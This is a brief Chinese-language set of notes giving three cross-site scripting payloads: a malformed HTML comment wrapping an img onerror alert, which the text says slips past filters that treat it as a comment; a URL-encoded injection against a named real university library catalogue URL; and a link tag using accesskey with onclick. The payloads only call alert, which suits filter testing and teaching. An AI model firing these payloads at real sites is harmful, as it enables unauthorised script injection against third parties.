1.
`<--<img/src= onerror=alert(x)> --!>`
在标准 HTML 中，注释通常是用 <!-- 开始，用 --> 结束的
有些防护系统可能认为这是注释，然后就忽略掉
而浏览器在处理非标准的html时候可能会忽略这些小错误，进而执行注入的代码
```
2. https://alephprod.library.nd.edu/F/?func=scan&scan_code=020&scan_start=0131487876%22%3E%3Cimg%20src=1%20onerror=alert()%3E\\
```

```
3. <link rel="canonical" accesskey="X" onclick="alert(1)" />
```